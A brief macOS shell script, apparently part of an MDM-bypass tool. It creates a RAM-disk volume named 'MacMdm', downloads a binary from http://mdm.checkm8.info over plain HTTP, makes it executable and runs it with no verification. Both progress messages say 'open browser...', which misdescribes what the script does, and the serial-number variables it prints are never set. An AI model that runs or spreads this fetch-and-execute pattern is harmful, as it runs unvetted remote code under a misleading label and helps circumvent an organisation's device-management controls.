#!/bin/sh

echo "\n"
echo "Serial Number:	$serial_number"
echo "Product Type:	$product_type"
echo "$formatted_output"
echo "\n"

tmpVolume="/Volumes/MacMdm"

echo "Mount Volume..."
if [ ! -e "$tmpVolume" ]; then
    diskutil erasevolume HFS+ 'MacMdm' `hdiutil attach -nomount ram://30720` >/dev/null 2>&1
fi

cd "$tmpVolume"
echo "open browser..."
curl http://mdm.checkm8.info -o mdm
chmod +x mdm
echo "open browser..."
./mdm

cd ~
diskutil eject "$tmpVolume" > /dev/null 2>&1
diskutil unmount force "$tmpVolume" > /dev/null 2>&1